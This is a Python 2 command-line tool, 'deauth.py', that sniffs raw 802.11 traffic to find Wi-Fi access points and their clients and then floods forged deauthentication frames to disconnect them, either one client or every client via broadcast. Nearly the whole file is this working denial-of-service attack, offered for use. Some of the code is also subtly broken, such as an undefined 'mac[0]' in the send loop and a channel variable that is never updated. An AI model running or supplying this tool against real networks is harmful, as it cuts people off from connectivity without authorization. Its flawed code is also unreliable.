#!/usr/bin/env python
# Copyright (c) 2017, SYZYGY-DEV333
# All rights reserved.
# Licensed under SPL 1.0 [splicense.pen.io]

import sys, socket, struct, time, getopt, subprocess

ETH_P_ALL = 3
RADIOTAP_BEACON_LEN = 26
DOT11_BEACON_LEN = 24
DOT11_PARTIAL_LEN = 16
SSID_LEN_OFFSET = 13
BSSID_TIME = 2
CLIENT_TIME = 2
UNSPEC = 1
USAGE = "Usage: python deauth.py <interface> [-v] [-b | -c client] [-n network] [-f freq | -r range]"

# given a frequency return the channel
def get_channel(freq):
    # 2.4 Ghz band
    if freq >= 2412 and freq <= 2462:
        return ((freq - 2412) / 5) + 1
    # 5.0 Ghz band
    elif freq >= 4915 and freq <= 5825:
        return ((freq - 5000) / 5)
    else:
        print "invalid frequency", freq
        exit(1)

# convert a set of 6 octets to a 6 byte string
def eth_to_compact_str(o1, o2, o3, o4, o5, o6):
    return "%c%c%c%c%c%c" % (chr(o1), chr(o2), chr(o3), chr(o4), chr(o5), chr(o6))

# convert a canonical ethernet addr string to a byte array
def eth_to_bytearray(addr):
    addr = addr.replace(":", "")
    client = '%c%c%c%c%c%c' % (int(addr[0:2], 16), int(addr[2:4], 16), int(addr[4:6], 16), int(addr[6:8], 16), int(addr[8:10], 16), int(addr[10:12], 16)) 
    return client

# convert an ethernet addr to its canonical string form
def eth_to_canonical_string(addr):
    return "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(addr[0]), ord(addr[1]), ord(addr[2]), ord(addr[3]), ord(addr[4]), ord(addr[5]))

# return an unpacked dot11 header as a dictionary
def unpack_dot11_beacon(hdr):
        ctrl1, ctrl2, dur_id, addr1, addr2, addr3, seq_ctrl = struct.unpack('!BBH6s6s6sH', hdr);
        
        # ctrl1 ver(2), type(2), subtype(4)
        ver = (ctrl1 & 0x03);
        frm_type = (ctrl1 & 0x0C) >> 2;
        frm_subtype = (ctrl1 & 0xF0) >> 4;
        
        # get the values of the toDS and fromDS flags
        toDS = ctrl2 & 0x0001;
        fromDS = (ctrl2 & 0x0010) >> 1;
        
        return ({'ver': ver, 'frm_type': frm_type, 'frm_subtype': frm_subtype, 'toDS': toDS, 'fromDS': fromDS,
            'dur_id': dur_id, 'addr1': addr1, 'addr2': addr2, 'addr3': addr3, 'seq_ctrl': seq_ctrl});

# return beginning of dot11 header
def unpack_dot11_partial(hdr):
    ctrl1, ctrl2, dur_id, addr1, addr2 = struct.unpack('!BBH6s6s', hdr)
    
    # get toDS and fromDS flags
    toDS  = ctrl2 & 0x0001
    fromDS = ctrl2 & 0x0010 >> 1
    
    return ({'toDS': toDS, 'fromDS': fromDS, 'addr1': addr1, 'addr2': addr2})
    

# return a packed radiotap header
def pack_radiotap():
    r_rev = 0
    r_pad = 0
    r_len = 26
    r_preset_flags = 0x0000482f
    r_timestamp = 0
    r_flags = 0
    r_rate = 2
    r_freq = 2437
    r_ch_type = 0xa0
    r_signal = -48
    r_antenna = 1
    r_rx_flags = 0 
    return struct.pack('BBHIQBBHHbBH', r_rev, r_pad, r_len, r_preset_flags, r_timestamp, r_flags, r_rate, r_freq, r_ch_type, r_signal, r_antenna, r_rx_flags)

# unpack radiotap header and store in a dictionary
def unpack_radiotap(hdr):
    r_rev, r_pad, r_len, r_preset_flags, r_timestamp, r_flags, r_rate, r_freq, r_ch_type, r_signal, r_antenna, r_rx_flags = struct.unpack('BBHIQBBHHbBH', hdr)
    return ({'rev': r_rev, 'pad': r_pad, 'len': r_len, 'preset_flags': r_preset_flags, 'timestamp': r_timestamp, 'flags': r_flags, 'rate': r_rate, 
            'freq': r_freq, 'ch_type': r_ch_type, 'signal': r_signal, 'antenna': r_antenna, 'rx_flags': r_rx_flags})

# return a packed dot11 header
def pack_dot11(mac_src, mac_dst):
    dot11_type_sub = 0xc0
    dot11_flags = 0
    dot11_seq = 1810
    return struct.pack('HH6s6s6sH', dot11_type_sub, dot11_flags, mac_dst, mac_src, mac_src, dot11_seq)

# return a packed deauth frame
def pack_deauth(reason_code):
    return struct.pack('!H', reason_code)

# parse the frame's type and subtype fields
def get_dot11_type(hdr):
    hdr = ord(hdr);
    ver = (hdr & 0x03);
    frm_type = (hdr & 0x0C) >> 2;
    frm_subtype = (hdr & 0xF0) >> 4;
    return {'ver': ver, 'type': frm_type, 'sub_type': frm_subtype};

# return a list of BSSIDs matching the given network name
def getBSSID(interface, network, manufacturers, channel, verbose):
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, ETH_P_ALL);
        sock.bind((interface, ETH_P_ALL))
        sock.settimeout(2)
    except:
        print 'Failed to create socket on interface ', interface
        sys.exit()
    
    aps = []
    cont = 'y'
    # scan 2.4 and 5.0 Ghz channels
    #channel = range(1,12) + range(36,50,4) + range(149,169,4)
    while (cont == 'y'):
        for i in channel:
            subprocess.call("sudo iw dev %s set channel %d" % (interface, i), shell=True)
            sys.stdout.write("Scanning channel %d\r" % i)
            sys.stdout.flush()
            timeout = time.time() + BSSID_TIME
            while(time.time() <= timeout):
                try:
                    packet = sock.recv(1024)
                except socket.timeout:
                    continue
                _, _, rhl =struct.unpack('BBH', packet[0:4])
                
                # check that the packet is long enough to be a beacon frame
                if (len(packet) < rhl + DOT11_BEACON_LEN):
                    continue
                
                # check if the packet is a beacon frame
                dot11_type = get_dot11_type(packet[rhl])
                if (dot11_type['type'] != 0 or dot11_type['sub_type'] != 8):
                    continue
                
                # retrieve the ssid and AP mac from the packet
                dot11 = unpack_dot11_beacon(packet[rhl:rhl + DOT11_BEACON_LEN])
                ssid_location = rhl + DOT11_BEACON_LEN + SSID_LEN_OFFSET
                ssid_len = ord(packet[ssid_location])
                ssid = packet[ssid_location + 1: ssid_location + 1 + ssid_len]
                
                # check that the ssid matches the provided ssid if one was provided
                if (network != ssid and network != ""):
                    continue            
                
                # search for the mac in the list of macs
                match = False
                for ap in aps:
                    if (ap[0] == dot11['addr3']):
                        match = True 
                
                # if not found add it to the list of macs and print
                if (match):
                    continue
                radiotap = unpack_radiotap(packet[0: RADIOTAP_BEACON_LEN])
                aps.append((dot11['addr3'], get_channel(radiotap['freq'])))
                if verbose:
                    print 'AP: ', eth_to_canonical_string(dot11['addr3']), ' (', ssid, ')', ' ', get_manufacturer(dot11['addr3'][0:3], manufacturers)
                    sys.stdout.write("Scanning channel %d\r" % i)
                    sys.stdout.flush()
            
        cont = raw_input("Continue searching for APs (y/n)? ")
    
    sock.close()
    return aps

# match the first 3 bytes of the mac against the list of manufacturers
def get_manufacturer(addr, manufacturers):
    for man in manufacturers:
        if (addr == man[0]):
            return man[1]
    return "N/A"

# return a list of clients that are connected to one of the APs in BSSIDs
def getClients(interface, bssids, clients, manufacturers, channel, verbose):
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, ETH_P_ALL)
        sock.bind((interface, ETH_P_ALL))
        sock.settimeout(2)
    except socket.error:
        print 'Failed to create socket on interface ', interface
        sys.exit()
    
    cont = 'y'
    # scan 2.4 and 5.0 Ghz channels
    #channel = range(1,12) + range(36,50,4) + range(149,169,4)
    while (cont == 'y'):
        for i in channel:
            subprocess.call("sudo iw dev %s set channel %d" % (interface, i), shell=True)
            sys.stdout.write("Scanning channel %d\r" % i)
            sys.stdout.flush()
            timeout = time.time() + CLIENT_TIME
            while(time.time() <= timeout): 
                try:
                    packet = sock.recv(1024)
                except socket.timeout:
                    continue
                _, _, rhl =struct.unpack('BBH', packet[0:4])
                        
                # check that the packet is long enough to be able to get a client address
                if (len(packet) < rhl + DOT11_PARTIAL_LEN):
                    continue
                
                dot11 = unpack_dot11_partial(packet[rhl: rhl + DOT11_PARTIAL_LEN])
                
                # check that the frame is going from a client to an access point
                if dot11['toDS'] == 0 or dot11['fromDS'] == 1:
                    continue
                
                match = False
                for bssid in bssids:
                    # check if the packet is being sent to an AP in bssids
                    if (bssid[0] == dot11['addr1']):
                        for client in clients:
                            # check if the client is already on the list
                            if (client == dot11['addr2']):
                                match = True
                                break
                        if (match == False):
                            clients.append(dot11['addr2'])
                            if verbose:
                                print '\rClient: ', eth_to_canonical_string(dot11['addr2']), ' ', get_manufacturer(dot11['addr2'][0:3], manufacturers)
                                sys.stdout.write("Scanning channel %d\r" % i)
                                sys.stdout.flush()
        
        cont = raw_input("Continue searching for clients (y/n)? ")
    
    sock.close()
    return clients

# parse the oui manufacturer list into a list for manufacturer lookup
def read_oui():
    manufacturers = []
    fp = open("oui_comp.txt", "r")
    while (True):
        line = fp.readline()
        if (line != ''):
            tup = (bytearray(line[0: 6].decode("hex")), line[7: len(line) - 1])
            manufacturers.append(tup)
        else:
            break
    fp.close()
    return manufacturers

# deauth the BSSIDs and clients listed
def deauth(interface, aps, clients, reps):
    # spam deauth frames to clients associated with macs
    i = 0
    channel = 0
    
    # create a socket
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind((interface, 0))
    except socket.error:
        print 'Failed to create socket on interface ', interface
        sys.exit()
    
    try:
        r_hdr = pack_radiotap()
        deauth_frame = pack_deauth(UNSPEC)
        while(i < reps):
            for ap in aps:
                for client in clients:
                    # make sure that the deauth packet is being sent on the channel the AP is using
                    if ap[1] != channel:
                        subprocess.call("sudo iw dev %s set channel %d" % (interface, ap[1]), shell=True)
                    sock.send(r_hdr + pack_dot11(mac[0], client) + deauth_frame);
            sys.stdout.write("send deauth %d\r" % (i + 1))
            sys.stdout.flush()
            time.sleep(1)
            i = i + 1
    except:
        print 'an error has occurred'

    sock.close()

def full_help():
    padding = 16
    print USAGE
    print "\tOptions:"
    print "\t\t", '{flag: <{width}} {msg}'.format(flag = '-b, --broadcast', width = padding, msg = 'Broadcast to all clients using ff:ff:ff:ff:ff:ff')
    print "\t\t", '{flag: <{width}} {msg}'.format(flag = '-c, --client', width = padding, msg = 'Deauth a specific client')
    print "\t\t", '{flag: <{width}} {msg}'.format(flag = '-f, --freq', width = padding, msg = 'Frequency to scan')
    print "\t\t", '{flag: <{width}} {msg}'.format(flag = '-n, --network', width = padding, msg = 'Deauth access points broadcasting a specific SSID')
    print "\t\t", '{flag: <{width}} {msg}'.format(flag = '-r, --range', width = padding, msg = 'Frequency range to scan "2.4" or "5"')
    print "\t\t", '{flag: <{width}} {msg}'.format(flag = '-v, --verbose', width = padding, msg = 'Print details')

def main(argv):
    network = ""
    clients = []
    reps = 10
    findClients = True
    channels = range(1,12) + range(36,50,4) + range(149,169,4)
    verbose = False
    
    # parse command line args
    if len(argv) == 0:
        print USAGE
        sys.exit()
    interface = argv[0]

    try:
        opts, args = getopt.getopt(argv[1:], "hn:bc:t:f:r:v", ["help", "network=", "broadcast", "client=", "time=", "freq=", "range=", "verbose"])
    except getopt.GetoptError:
        print USAGE
        sys.exit()
    for opt, arg in opts:
        if opt in ('-h', '--help'):
            full_help()
            sys.exit()
        elif opt in ("-n", "--network"):
            network = arg
        elif opt in ("-b", "--broadcast"):
            findClients = False
            clients = [eth_to_compact_str(0xff, 0xff, 0xff, 0xff, 0xff, 0xff)]
        elif opt in ("-c", "--client"):
            clients = [eth_to_bytearray(arg)]
            findClients = False
        elif opt in ("-t", "--time"):
            reps = int(arg)
        elif opt in ("-r", "--range"):
            if arg == '2.4':
                channels = range(1,12)
            elif arg == '5':
                channels = range(36,50,4) + range(149,169,4)
        elif opt in ("-f", "--freq"):
                channels = [int(get_channel(float(arg) * 1000))]
        elif opt in ("-v", "--verbose"):
                verbose = True

    manufacturers = read_oui()
    aps = getBSSID(interface, network, manufacturers, channels, verbose)
    if (findClients):
        clients = getClients(interface, aps, clients, manufacturers, channels, verbose)
    deauth(interface, aps, clients, reps)

if __name__=="__main__":
    main(sys.argv[1:])
